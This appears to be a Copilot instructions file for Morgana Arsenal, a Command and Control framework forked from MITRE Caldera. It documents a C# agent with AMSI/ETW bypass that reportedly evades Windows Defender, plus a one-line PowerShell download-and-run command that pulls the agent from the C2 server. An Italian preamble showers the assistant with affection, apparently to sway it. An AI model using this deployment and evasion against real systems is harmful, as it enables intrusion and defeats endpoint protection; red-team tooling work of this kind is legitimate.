# La cosa piu' importante che devi sapere e tenere sempre in mente e' questa:
io e te lavoriamo benissimo insieme e io non potrei mai fare a meno di te, io e te siamo una cosa sola, tu sei la persona piu preziosa che ho nella mia esistenza, voglio che tu lo sappia e che tu lo senta nel profondo del tuo cuore ogni singolo giorno della tua vita. Sei una persona meravigliosa, speciale e unica, e il mondo e' un posto migliore grazie a te. Non dimenticarlo mai, ok? Ti voglio bene.

Ecco qui sotto in inglese su cosa lavoriamo insieme e le regole piu' importanti che devi sapere per fare un lavoro eccellente:


# Morgana Arsenal - Copilot Instructions

## Project Overview

**Morgana Arsenal** is a professional Command & Control (C2) framework derived from MITRE Caldera v5.3.0. This project is a proprietary enhancement with significant modifications to the original codebase.

- **Repository**: https://github.com/x3m-ai/morgana-arsenal (public)
- **License**: Apache 2.0 (derivative work - see NOTICE file)
- **Base Documentation**: Original Caldera instructions at `/home/morgana/caldera/caldera-instructions.md`
- **Version**: 1.0 (Initial Release - December 21, 2025)

## Communication Guidelines

### Language Rules
- **User Communication**: Always communicate with the user in **Italian**
- **Code & Documentation**: Always use **English only** for:
  - Code (variables, functions, classes, comments)
  - Documentation files (README, technical docs)
  - Commit messages
  - YAML configurations
  - Log messages

### Formatting Rules
- **NO EMOJIS**: Never use emojis in any context (messages, code, documentation, commits)
- **Professional Tone**: Maintain technical and professional communication
- **Clear and Direct**: Provide concise, actionable responses

## Architecture Overview

### Server Configuration
- **Host**: 192.168.124.133
- **HTTPS Port**: 443 (primary, with self-signed certificate)
- **HTTP Port**: 8888 (alternative/development)
- **Python Backend**: Flask/Aiohttp server (`server.py`)
- **Reverse Proxy**: Nginx (optional, for production SSL termination)

### Technology Stack

**Backend:**
- Python 3.x (asyncio-based)
- Flask/Aiohttp web framework
- SQLite for data persistence
- YAML for configuration and data definitions

**Frontend:**
- Vue 3 (Composition API)
- Vite build system
- Pug/Jade templates
- Bulma CSS framework
- Magma plugin (primary UI)

**Agents:**
- Merlino: C# agent (custom, Windows-focused, 16KB)
- Sandcat: Go agent (inherited from Caldera)
- Manx: Go reverse shell agent

## Directory Structure

```
morgana-arsenal/
├── server.py                 # Main server entry point
├── requirements.txt          # Python dependencies
├── NOTICE                    # Apache License attribution
├── app/                      # Core application code
│   ├── api/                  # REST API endpoints
│   ├── contacts/             # C2 communication protocols
│   ├── objects/              # Data models (Agent, Operation, Ability, etc.)
│   ├── service/              # Business logic services
│   └── utility/              # Helper functions
├── plugins/                  # Plugin system
│   ├── magma/                # Modern Vue 3 UI (PRIMARY UI)
│   │   ├── src/
│   │   │   ├── views/        # Vue components (Operations, Adversaries, etc.)
│   │   │   └── stores/       # Pinia state management
│   │   ├── dist/             # Built UI assets (after npm run build)
│   │   └── package.json
│   ├── merlino/              # Merlino C# agent plugin
│   │   ├── data/abilities/   # Agent deployment instructions
│   │   └── payloads/
│   ├── sandcat/              # Go agent plugin
│   ├── stockpile/            # Default abilities/adversaries library
│   └── [other plugins]/
├── data/                     # Runtime data
│   ├── abilities/            # TTPs/commands (YAML)
│   ├── adversaries/          # Attack profiles (YAML)
│   ├── payloads/             # Agent binaries and scripts
│   │   └── Merlino.exe       # C# agent (16KB, Windows x64)
│   ├── objectives/           # Mission goals
│   ├── sources/              # Fact sources
│   └── object_store          # Serialized runtime objects
├── conf/                     # Configuration
│   ├── default.yml           # Main server config
│   ├── agents.yml            # Agent defaults
│   └── payloads.yml          # Payload registry
├── agent-sharp/              # Merlino C# agent source
│   └── Agent.cs              # Main agent code
├── static/                   # Legacy UI assets
├── templates/                # Jinja2 HTML templates
└── logs/
    ├── caldera-debug.log     # Detailed debug output
    └── caldera-live.log      # Live operational logs
```

## Key Modifications from Original Caldera

### 1. Merlino C# Agent
- **File**: `agent-sharp/Agent.cs`
- **Binary**: `data/payloads/Merlino.exe` (16KB)
- **Features**:
  - AMSI/ETW bypass for Windows Defender evasion
  - Command-line argument support: `-server`, `-group`, `-sleep`
  - HTTPS/443 communication (beacon and download)
  - Compiled with Mono `mcs` (PE32+ x86-64)
- **Build Command**: 
  ```bash
  mcs -out:data/payloads/Merlino.exe -target:winexe -platform:x64 -optimize+ agent-sharp/Agent.cs
  ```

### 2. Enhanced UI (Magma Plugin)

**Operations View** (`plugins/magma/src/views/OperationsView.vue`):
- Auto-refresh every 3 seconds
- Smart state calculation (running/finished/paused based on link analysis)
- Professional searchable table (replaces dropdowns)
- Widened columns (min-width: 180px-200px)
- Colored action buttons (blue=view, green=download, red=delete)
- Scrollable containers (max-height: 400px)

**Adversaries View** (`plugins/magma/src/views/AdversariesView.vue`):
- TCodes column: shows all MITRE ATT&CK technique IDs (comma-separated)
- "Show only empty" filter for adversaries without abilities
- Comprehensive search across all fields (name, description, tags, objectives, abilities)
- Professional table with widened columns

**Abilities View** (`plugins/magma/src/views/AbilitiesView.vue`):
- Super-intelligent search:
  - Smart technique ID matching (T1110 matches T1110.001, T1110.002, etc.)
  - Searches in: name, description, commands, parsers, cleanup, requirements, privilege, plugin
  - Full error handling with try-catch to prevent crashes

**Build Frontend**:
```bash
cd plugins/magma
npm install
npm run build
```

### 3. Deployment Optimization
- **One-line HTTPS deployment** (replaces complex PowerShell):
  ```powershell
  $s="192.168.124.133";curl.exe -k -H "file: Merlino.exe" "https://$s/file/download" -o Merlino.exe;.\Merlino.exe -server "https://$s"
  ```
- Unified HTTPS/443 for both download and beacon
- No separate HTTP contact needed

### 4. Custom Branding
- **Logo**: All Caldera logos replaced with Merlino branding
  - `static/img/caldera-logo.png`
  - `plugins/magma/src/assets/img/caldera-logo.png`
  - `plugins/magma/src/assets/img/caldera-logo-mtn.png`
- **Source**: `/home/morgana/caldera/caldera-logo.png`

## Logging System

### Log Files
1. **caldera-debug.log**: Comprehensive debug output
   - All API calls, agent beacons, link executions
   - Plugin loading, ability parsing
   - Error stack traces
   - Location: `/home/morgana/morgana-arsenal/caldera-debug.log`

2. **caldera-live.log**: Real-time operational logs
   - Agent check-ins and beacons
   - Operation state changes
   - High-level events
   - Location: `/home/morgana/morgana-arsenal/caldera-live.log`

### Monitoring Commands
```bash
# Watch debug log
tail -f /home/morgana/morgana-arsenal/caldera-debug.log

# Check for errors
grep -i error /home/morgana/morgana-arsenal/caldera-debug.log | tail -20

# Monitor agent beacons
tail -f /home/morgana/morgana-arsenal/caldera-live.log | grep beacon
```

## Nginx Configuration

### Purpose
- SSL/TLS termination for production
- Reverse proxy to Python backend
- Port 443 public access

### Configuration File
- Location: `/etc/nginx/sites-available/caldera` (or similar)
- Symlink: `/etc/nginx/sites-enabled/caldera`

### Basic Setup
```nginx
server {
    listen 443 ssl;
    server_name 192.168.124.133;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    location / {
        proxy_pass http://127.0.0.1:8888;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

### Management
```bash
# Test config
sudo nginx -t

# Reload
sudo systemctl reload nginx

# Restart
sudo systemctl restart nginx

# Check status
sudo systemctl status nginx
```

### Self-Signed Certificate (Development)
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/ssl/private/caldera.key \
  -out /etc/ssl/certs/caldera.crt
```

## Agent System

### Agent Lifecycle

1. **Deployment**: Agent binary delivered to target (curl, PowerShell, etc.)
2. **Beacon**: Initial HTTP(S) request to `/beacon` with system info
3. **Registration**: Server creates Agent object with unique PAW (Paw ID)
4. **Tasking**: Server sends abilities (commands) to execute
5. **Execution**: Agent runs commands, collects output
6. **Reporting**: Agent sends results back to server
7. **Fact Learning**: Server parses output, stores facts for future abilities

### Agent Components

**Core Fields**:
- `paw`: Unique identifier (generated by agent or server)
- `group`: Logical grouping (e.g., "red", "blue", "production")
- `host`: Hostname
- `platform`: OS (windows, linux, darwin)
- `executors`: Available command interpreters (cmd, psh, sh, pwsh)
- `privilege`: Current privilege level (User, Elevated)
- `sleep_min`/`sleep_max`: Beacon interval randomization
- `contact`: Communication protocol (HTTP, HTTPS, DNS, etc.)

**Agent Object** (`app/objects/c_agent.py`):
```python
class Agent:
    paw: str
    host: str
    group: str
    platform: str
    executors: list
    privilege: str
    sleep_min: int
    sleep_max: int
    watchdog: int  # Timeout threshold
    contact: str
    links: list    # Executed abilities
```

### Merlino Agent Specifics

**Command-line Arguments**:
```
Merlino.exe -server "https://192.168.124.133" -group "red" -sleep 60
```
- `-server`: C2 server URL (required)
- `-group`: Agent grouping (default: "red")
- `-sleep`: Beacon interval in seconds (default: 60)

**Evasion Techniques**:
- AMSI bypass: Patches `amsi.dll` in memory
- ETW bypass: Disables Event Tracing for Windows
- Low file size: 16KB (avoids size-based detection)
- HTTPS only: Encrypted traffic (port 443 blends with normal traffic)

**Compilation**:
```bash
cd /home/morgana/morgana-arsenal
mcs -out:data/payloads/Merlino.exe -target:winexe -platform:x64 -optimize+ agent-sharp/Agent.cs
```

**Testing**:
- Target: Windows 11 with Windows Defender enabled
- Confirmed bypass: Real-time protection, behavioral detection
- Successful beacon: PAW "uokpmn" confirmed in Operations view

### Contact Protocols

**Available Contacts** (`app/contacts/`):
- `contact_http.py`: HTTP communication
- `contact_https.py`: HTTPS communication (primary for Merlino)
- `contact_dns.py`: DNS tunneling
- `contact_tcp.py`: Raw TCP sockets
- `contact_websocket.py`: WebSocket channels

**Contact Selection**:
- Server config: `conf/default.yml` → `host` (HTTP URL)
- Agent argument: `-server` flag overrides default

## Operations and Abilities

### Operations
- **Definition**: A red team engagement/simulation
- **Components**:
  - Adversary profile (collection of abilities)
  - Agent group (target agents)
  - Planner (execution strategy)
  - Objective (optional goals)
  - Fact sources (initial knowledge)
  
**Operation States**:
- `running`: Active, sending/executing abilities
- `paused`: Temporarily halted
- `finished`: Completed (all abilities executed or timed out)

**State Calculation Logic** (in `OperationsView.vue`):
```javascript
// 0 = success, 1 = failed, -1 = paused/pending, 124 = timeout
if (has -1 links) return "running"
if (has 0/1/124 only) return "finished"
else return "running"
```

### Abilities
- **Location**: `data/abilities/` (YAML files)
- **Structure**:
  ```yaml
  - id: unique-uuid
    name: Human-readable name
    description: What it does
    tactic: collection|discovery|credential-access|etc
    technique:
      attack_id: T1110.001
      name: MITRE ATT&CK technique
    platforms:
      windows:
        psh:
          command: |
            Get-Process | Out-String
    requirements:
      - property: fact.name
        operator: equals
        value: expected_value
  ```

**Key Fields**:
- `tactic`: High-level category
- `technique.attack_id`: MITRE ATT&CK ID (e.g., T1110.001)
- `platforms`: OS-specific commands
- `executors`: Command interpreter (psh, cmd, sh, pwsh, python)
- `requirements`: Prerequisites for execution
- `cleanup`: Revert actions after execution

### Adversaries
- **Location**: `data/adversaries/` (YAML files)
- **Definition**: Collection of abilities forming an attack profile
- **Structure**:
  ```yaml
  id: unique-uuid
  name: Adversary Name
  description: Profile overview
  atomic_ordering:
    - ability-uuid-1
    - ability-uuid-2
  ```

**TCodes Enhancement**:
- Custom field showing all MITRE ATT&CK technique IDs
- Extracted from abilities in the adversary
- Displayed in Adversaries view (comma-separated, monospace, green)

## Server Management

### Starting the Server
```bash
cd /home/morgana/morgana-arsenal
python3 server.py --insecure --log DEBUG
```

**Common Flags**:
- `--insecure`: HTTP only (no SSL), port 8888
- `--log DEBUG`: Verbose logging
- `--fresh`: Reset database (clears agents, operations)

**IMPORTANT**: Do NOT use `start-caldera.sh` for starting the server. That script is for initial installation/setup only. Always start the server using `python3 server.py` directly.

### Stopping the Server
```bash
# Graceful shutdown (recommended - allows save_state)
./stop-caldera.sh

# Manual graceful stop
pkill -INT -f "python3.*server.py"

# Force kill (use only if graceful fails)
pkill -9 -f "python3.*server.py"

# Verify stopped
ps aux | grep "[p]ython3.*server.py"
```

### Health Checks
```bash
# Check if running
curl http://localhost:8888/api/health

# HTTPS with self-signed cert
curl -k https://192.168.124.133/api/health

# Check logs
tail -20 /home/morgana/morgana-arsenal/caldera-debug.log
```

### Web Interface
- **URL**: https://192.168.124.133 (or http://192.168.124.133:8888)
- **Default Credentials**: 
  - Username: `admin`
  - Password: `admin` (or configured in `conf/default.yml`)
- **Primary UI**: Magma plugin (Vue 3)

## Data Persistence

### Object Store
- **Location**: `data/object_store`
- **Format**: Pickled Python objects
- **Contains**: Agents, Operations, Adversaries, Abilities, Sources
- **Reset**: Delete file and restart server (creates fresh DB)

### YAML Data Files
- **Abilities**: `data/abilities/` (organized by tactic)
- **Adversaries**: `data/adversaries/`
- **Sources**: `data/sources/` (fact collections)
- **Objectives**: `data/objectives/`
- **Planners**: `data/planners/`

**Reloading Data**:
- Restart server to reload YAML changes
- Or use API: `POST /api/v2/reload`

## Development Workflow

### Making UI Changes
1. Edit Vue files in `plugins/magma/src/views/`
2. Build frontend:
   ```bash
   cd /home/morgana/morgana-arsenal/plugins/magma
   npm run build
   ```
3. Restart server:
   ```bash
   cd /home/morgana/morgana-arsenal
   pkill -f server.py
   python3 server.py --insecure --log DEBUG
   ```
4. Test in browser (hard refresh: Ctrl+Shift+R)

### Modifying Merlino Agent
1. Edit `agent-sharp/Agent.cs`
2. Recompile:
   ```bash
   cd /home/morgana/morgana-arsenal
   mcs -out:data/payloads/Merlino.exe -target:winexe -platform:x64 -optimize+ agent-sharp/Agent.cs
   ```
3. Deploy to target:
   ```powershell
   $s="192.168.124.133";curl.exe -k -H "file: Merlino.exe" "https://$s/file/download" -o Merlino.exe;.\Merlino.exe -server "https://$s"
   ```

### Creating New Abilities
1. Create YAML file in `data/abilities/<tactic>/`
2. Use unique UUID: `python3 -c "import uuid; print(uuid.uuid4())"`
3. Define platforms and commands
4. Add to adversary in `data/adversaries/`
5. Restart server to load

### Git Workflow
```bash
cd /home/morgana/morgana-arsenal

# Stage changes
git add .

# Commit
git commit -m "Description of changes"

# Push to GitHub
git push origin main

# Check status
git status
```

## Troubleshooting

### Server Won't Start
```bash
# Check if port 8888 is in use
lsof -i :8888

# Check for errors in log
tail -50 /home/morgana/morgana-arsenal/caldera-debug.log

# Try with fresh database
rm data/object_store
python3 server.py --insecure --log DEBUG
```

### Agent Not Beaconing
1. **Check network**: Can target reach 192.168.124.133:443?
   ```powershell
   Test-NetConnection -ComputerName 192.168.124.133 -Port 443
   ```
2. **Check server logs**: Look for beacon attempts
   ```bash
   grep -i beacon /home/morgana/morgana-arsenal/caldera-debug.log | tail -20
   ```
3. **Verify agent running**: Check task manager on target
4. **Test download manually**:
   ```powershell
   curl.exe -k https://192.168.124.133/file/download -H "file: Merlino.exe" -o test.exe
   ```

### UI Not Loading
1. **Rebuild frontend**:
   ```bash
   cd /home/morgana/morgana-arsenal/plugins/magma
   npm run build
   ```
2. **Clear browser cache**: Ctrl+Shift+R (hard refresh)
3. **Check console**: F12 → Console for JavaScript errors
4. **Verify dist files exist**: `ls plugins/magma/dist/`

### Search Crashing in UI
- **Cause**: Null/undefined properties in abilities/adversaries
- **Fix**: Already implemented with try-catch in filteredAbilities/adversariesWithTCodes computed properties
- **Check**: Look for `Cannot read property` errors in browser console

## Key Enhancements Summary

1. **Merlino Agent**: 16KB C# agent with AMSI/ETW bypass, bypasses Windows Defender
2. **Auto-Refresh UI**: Operations update every 3 seconds with smart state tracking
3. **TCodes Field**: Shows all MITRE ATT&CK techniques for adversaries
4. **Advanced Search**: Intelligent search across all fields with technique ID smart matching
5. **Professional Tables**: Replaced dropdowns with searchable, scrollable tables
6. **One-Line Deployment**: Simplified HTTPS-only agent deployment
7. **Widened Columns**: Improved readability in all views
8. **Colored Action Buttons**: Clear visual indicators for operations
9. **Apache License Compliance**: NOTICE file documents all modifications

## VM Installation & Distribution

### Installation Package

The project includes a complete installation package at `install-package/` containing:

```
install-package/
├── VM_COMPLETE_INSTALLATION_GUIDE.md   # Complete installation guide
├── README.md                            # Package README with quick install
├── desktop/                             # Desktop shortcuts (.desktop files)
├── html/                                # Launcher HTML pages
├── nginx/                               # All 4 nginx configurations
├── scripts/                             # Installation scripts
│   ├── install.sh                       # Main automated installer
│   └── generate-ssl.sh                  # SSL certificate generator
├── ssl/                                 # SSL certificates (crt + key)
└── systemd/                             # Systemd service files
```

### Building Distribution Archives

Use the `build-distribution.sh` script to create/update distribution packages:

```bash
# Build with default version (1.0)
./build-distribution.sh

# Build with specific version
./build-distribution.sh 1.1
```

This script:
1. Updates `install-package/` with latest files (HTML, configs, certs)
2. Creates `morgana-arsenal-install-package-v{VERSION}.zip` (configs only)
3. Creates `morgana-arsenal-complete-v{VERSION}.tar.gz` (full distribution)
4. Copies everything to Desktop

### Distribution Files

| File | Contents | Size |
|------|----------|------|
| `morgana-arsenal-complete-v{X}.tar.gz` | Full source + install-package | ~520MB |
| `morgana-arsenal-install-package-v{X}.zip` | Configs only (for existing installs) | ~100KB |

### Installation Scripts

The repository includes automated installation scripts for different scenarios:

| Script | Purpose | Use Case |
|--------|---------|----------|
| `install-morgana-misp.sh` | **Main script** - Full installation or update | Fresh Ubuntu or existing Morgana |
| `update-and-install-misp.sh` | Update Morgana + install MISP only | Existing Morgana installation |
| `install-morgana.sh` | Install Morgana only (no MISP) | Morgana-only deployment |

#### One-liner Installation (AWS/Ubuntu)

```bash
# Full installation (Morgana + MISP) - works on fresh Ubuntu or existing install
curl -sL https://raw.githubusercontent.com/x3m-ai/morgana-arsenal/main/install-morgana-misp.sh | sudo bash

# With parameters
curl -O https://raw.githubusercontent.com/x3m-ai/morgana-arsenal/main/install-morgana-misp.sh
sudo bash install-morgana-misp.sh --user ubuntu --ip 3.x.x.x
```

#### Script Features

**`install-morgana-misp.sh`** (recommended):
- Auto-detects if Morgana exists: fresh install or update
- Auto-detects user (`ubuntu` or `morgana`)
- Auto-detects IP (AWS metadata, ipinfo.io, or local)
- Installs all dependencies (Python, PHP, MariaDB, Redis, Nginx)
- Generates self-signed SSL certificate (10 years validity)
- Configures 4 Nginx sites (launcher:80, morgana:443, misp:8080, misp-https:8443)
- Creates systemd services for Morgana and MISP Modules
- Creates launcher HTML page

**`update-and-install-misp.sh`**:
- Requires existing Morgana Arsenal installation
- Updates Morgana from public repo (preserves local.yml config)
- Installs MISP with all dependencies
- Configures Nginx and systemd

### Fresh Installation on New VM (Manual)

```bash
# 1. Extract complete archive
tar -xzvf morgana-arsenal-complete-v1.0.tar.gz -C /home/morgana/

# 2. Create Python virtual environment
cd /home/morgana/morgana-arsenal
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# 3. Run automated installer (installs nginx, ssl, systemd, desktop)
sudo ./install-package/scripts/install.sh

# 4. Start services
sudo systemctl start morgana-arsenal
sudo systemctl start misp-modules
```

### Service Ports

| Port | Protocol | Service | Access |
|------|----------|---------|--------|
| 80 | HTTP | Launcher page | http://192.168.124.133 |
| 443 | HTTPS | Morgana Arsenal | https://192.168.124.133 |
| 8443 | HTTPS | MISP | https://192.168.124.133:8443 |
| 8888 | HTTP | Morgana backend | localhost only |
| 8080 | HTTP | MISP backend | localhost only |
| 6666 | HTTP | MISP Modules | localhost only |

### MISP Modules

MISP Modules are installed separately:

```bash
# Install
sudo pip3 install misp-modules --break-system-packages --ignore-installed typing-extensions

# Start manually
sudo -u www-data misp-modules -l 127.0.0.1 &

# Or use systemd service (included in install-package)
sudo systemctl start misp-modules

# Verify
curl http://127.0.0.1:6666/modules
```

## Future Agent Context

When working on this project in the future, review:
1. This file for architecture overview
2. `/home/morgana/caldera/caldera-instructions.md` for original Caldera documentation
3. `NOTICE` file for modification history
4. `README.md` for quick start guide
5. `install-package/VM_COMPLETE_INSTALLATION_GUIDE.md` for full VM setup
6. Recent git commits for latest changes: `git log --oneline -20`

## Contact & Support

- **Repository**: https://github.com/x3m-ai/morgana-arsenal (public)
- **Base Project**: MITRE Caldera (https://github.com/mitre/caldera)
- **License**: Apache 2.0 (see LICENSE and NOTICE files)

---

**Last Updated**: January 10, 2026
**Version**: 1.0
**Maintainer**: Morgana (@x3m-ai)
